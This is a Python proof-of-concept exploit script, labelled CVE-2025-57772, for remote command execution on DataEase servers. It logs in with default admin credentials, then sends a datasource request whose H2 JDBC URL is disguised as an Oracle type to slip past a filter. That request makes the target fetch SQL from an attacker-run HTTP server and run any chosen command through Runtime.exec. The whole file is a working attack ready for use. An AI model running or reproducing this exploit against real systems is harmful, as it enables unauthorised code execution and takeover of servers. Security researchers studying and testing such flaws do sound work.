#!/usr/bin/env python3

import argparse
import json
import sys
import time
import threading
import base64
import http.server
import socketserver
import requests
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5

requests.packages.urllib3.disable_warnings()


class SQLFileServer(threading.Thread):
    def __init__(self, port, command):
        super().__init__(daemon=True)
        self.port = port
        self.command = command
        self.request_received = False
        self.httpd = None

    def run(self):
        parent = self

        class Handler(http.server.SimpleHTTPRequestHandler):
            def do_GET(self):
                if self.path == "/poc.sql":
                    parent.request_received = True
                    print(f"[+] HTTP request received: {self.path}")
                    sql_content = f"""CREATE ALIAS IF NOT EXISTS EXEC AS 'String shellexec(String cmd) throws java.io.IOException {{ Runtime.getRuntime().exec(cmd); return "ok"; }}';
CALL EXEC('{parent.command}');"""
                    self.send_response(200)
                    self.send_header("Content-type", "text/plain")
                    self.send_header("Content-Length", len(sql_content))
                    self.end_headers()
                    self.wfile.write(sql_content.encode())
                else:
                    self.send_response(404)
                    self.end_headers()

            def log_message(self, format, *args):
                print(f"[HTTP] {args[0]}")

        try:
            self.httpd = socketserver.TCPServer(("0.0.0.0", self.port), Handler)
            self.httpd.socket.settimeout(1)
            print(f"[*] HTTP server listening on port {self.port}")
            start_time = time.time()
            while time.time() - start_time < 30:
                self.httpd.handle_request()
                if self.request_received:
                    time.sleep(2)
                    break
        except Exception as e:
            print(f"[-] HTTP server error: {e}")
        finally:
            if self.httpd:
                self.httpd.server_close()


def get_dekey(target):
    url = f"{target}/de2api/dekey"
    try:
        resp = requests.get(url, verify=False, timeout=30)
        if resp.status_code == 200:
            result = resp.json()
            if result.get("code") == 0:
                return result.get("data")
    except Exception as e:
        print(f"[-] Get dekey error: {e}")
    return None


def decrypt_public_key(dekey):
    separator = base64.b64encode(b'-pk_separator-').decode('utf-8')
    parts = dekey.split(separator)
    if len(parts) != 2:
        return None
    k1, k2 = parts
    try:
        iv = b'0000000000000000'
        key = k2.encode('utf-8')
        if len(key) < 16:
            key = key.ljust(16, b'\x00')
        elif len(key) > 16:
            key = key[:16]
        cipher = AES.new(key, AES.MODE_CBC, iv)
        decrypted = cipher.decrypt(base64.b64decode(k1))
        pk = unpad(decrypted, AES.block_size).decode('utf-8')
        return pk
    except Exception as e:
        print(f"[-] Decrypt public key error: {e}")
        return None


def rsa_encrypt(data, public_key_b64):
    der_data = base64.b64decode(public_key_b64)
    key = RSA.import_key(der_data)
    cipher = PKCS1_v1_5.new(key)
    encrypted = cipher.encrypt(data.encode('utf-8'))
    return base64.b64encode(encrypted).decode('utf-8')


def login(target, username, password):
    dekey = get_dekey(target)
    if not dekey:
        print("[-] Failed to get dekey")
        return None

    public_key = decrypt_public_key(dekey)
    if not public_key:
        print("[-] Failed to decrypt public key")
        return None

    encrypted_name = rsa_encrypt(username, public_key)
    encrypted_pwd = rsa_encrypt(password, public_key)

    url = f"{target}/de2api/login/localLogin"
    data = {"name": encrypted_name, "pwd": encrypted_pwd, "origin": 0}
    headers = {"Content-Type": "application/json"}

    try:
        resp = requests.post(url, json=data, headers=headers, verify=False, timeout=30)
        if resp.status_code == 200:
            result = resp.json()
            if result.get("code") == 0:
                token = result.get("data", {}).get("token")
                if token:
                    print(f"[+] Login successful")
                    return token
        print(f"[-] Login failed: {resp.text[:200]}")
    except Exception as e:
        print(f"[-] Login error: {e}")
    return None


def exploit_h2_rce(target, token, callback_url):
    url = f"{target}/de2api/datasource/validate"
    headers = {
        "Content-Type": "application/json",
        "X-DE-TOKEN": token
    }

    h2_jdbc_url = f"jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM '{callback_url}/poc.sql'"

    configuration = {
        "dataBase": "",
        "driver": "org.h2.Driver",
        "jdbcUrl": h2_jdbc_url,
        "urlType": "jdbcUrl",
        "sshType": "password",
        "extraParams": "",
        "username": "",
        "password": "",
        "host": "",
        "authMethod": "",
        "port": 0,
        "initialPoolSize": 5,
        "minPoolSize": 5,
        "maxPoolSize": 5,
        "queryTimeout": 30,
        "connectionType": "sid"
    }

    config_b64 = base64.b64encode(json.dumps(configuration).encode('utf-8')).decode('utf-8')

    payload = {
        "id": None,
        "pid": 0,
        "name": "h2_exploit_test",
        "nodeType": "datasource",
        "type": "oracle",
        "configuration": config_b64
    }

    print(f"[*] Sending H2 JDBC RCE bypass payload...")
    print(f"[*] Using type='oracle' to bypass H2 filter")
    print(f"[*] H2 JDBC URL: {h2_jdbc_url}")

    try:
        resp = requests.post(url, json=payload, headers=headers, verify=False, timeout=60)
        return resp
    except requests.exceptions.ReadTimeout:
        print("[*] Request timeout (may indicate RCE execution)")
        return None
    except Exception as e:
        print(f"[-] Exploit error: {e}")
        return None


def check_vulnerability(target, token, callback_host, callback_port, command):
    http_server = SQLFileServer(callback_port, command)
    http_server.start()
    time.sleep(1)

    callback_url = f"http://{callback_host}:{callback_port}"
    resp = exploit_h2_rce(target, token, callback_url)

    time.sleep(5)

    if http_server.request_received:
        print("[+] VULNERABILITY CONFIRMED: Target fetched poc.sql!")
        print(f"[+] Command '{command}' should have been executed on target")
        return True
    else:
        print("[-] No HTTP request received for poc.sql")
        if resp:
            print(f"[*] Response status: {resp.status_code}")
            try:
                result = resp.json()
                print(f"[*] Response: code={result.get('code')}, msg={result.get('msg', '')[:200]}")
            except:
                print(f"[*] Response body: {resp.text[:200]}")
        return False


def main():
    parser = argparse.ArgumentParser(description="CVE-2025-57772 DataEase H2 JDBC RCE Bypass PoC")
    parser.add_argument("-t", "--target", required=True, help="Target URL (e.g., http://192.168.1.100:8100)")
    parser.add_argument("-u", "--username", default="admin", help="DataEase username (default: admin)")
    parser.add_argument("-p", "--password", default="DataEase@123456", help="DataEase password (default: DataEase@123456)")
    parser.add_argument("-c", "--callback", required=True, help="Callback host IP (reachable from target)")
    parser.add_argument("--port", type=int, default=8888, help="Callback port for HTTP server (default: 8888)")
    parser.add_argument("--cmd", default="touch /tmp/pwned", help="Command to execute (default: touch /tmp/pwned)")

    args = parser.parse_args()
    target = args.target.rstrip("/")

    print("=" * 60)
    print("CVE-2025-57772 DataEase H2 JDBC RCE Bypass PoC")
    print("=" * 60)
    print(f"[*] Target: {target}")
    print(f"[*] Callback: {args.callback}:{args.port}")
    print(f"[*] Command: {args.cmd}")
    print()

    print("[*] Step 1: Logging in to DataEase...")
    token = login(target, args.username, args.password)
    if not token:
        print("[-] Failed to login. Cannot proceed.")
        sys.exit(1)

    print()
    print("[*] Step 2: Starting HTTP server and sending H2 RCE bypass exploit...")
    vulnerable = check_vulnerability(target, token, args.callback, args.port, args.cmd)

    print()
    print("=" * 60)
    if vulnerable:
        print("[+] Target is VULNERABLE to CVE-2025-57772")
        print("[+] H2 JDBC RCE bypass via type confusion confirmed!")
    else:
        print("[-] Target does not appear to be vulnerable")
    print("=" * 60)

    return 0 if vulnerable else 1


if __name__ == "__main__":
    sys.exit(main())
